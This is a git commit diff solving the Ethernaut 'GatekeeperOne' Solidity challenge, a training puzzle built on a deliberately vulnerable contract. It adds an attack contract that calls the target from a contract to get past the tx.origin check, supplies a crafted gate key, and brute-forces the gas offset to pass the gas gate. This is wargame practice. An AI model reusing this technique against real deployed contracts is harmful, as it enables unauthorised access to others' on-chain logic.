5d931b1efac22f703420030364d524f7885f62cb
TJR181 <1552019573@qq.com>
2025-07-27 16:27:48 +0800

    pass etheranut GatekeeperOne

--- security/etheranut/GatekeeperOne/GatekeeperOne.sol
+++ security/etheranut/GatekeeperOne/GatekeeperOne.sol
@@ -5,7 +5,7 @@ contract GatekeeperOne {
     address public entrant;
 
     modifier gateOne() {
-        require(msg.sender != tx.origin);
+        require(msg.sender != tx.origin);    //use contract bypsss
         _;
     }
 
@@ -24,5 +24,19 @@ contract GatekeeperOne {
     function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
         entrant = tx.origin;
         return true;
+    }
+}
+
+contract Hack {
+    address target = 0xe0a3D2351a60b4d67F4341C22da3C16006e7f475;
+    GatekeeperOne gk = GatekeeperOne(target);
+    function attack() public {
+        bytes8 gateKey = 0x100000000000EF65;
+        for (uint256 i = 0; i < 400; i++){
+            (bool success, ) = address(gk).call{gas: 8191 * 4 + i}(abi.encodeWithSignature("enter(bytes8)", gateKey));
+            if (success) {
+                break;
+            }
+        }
     }
 }
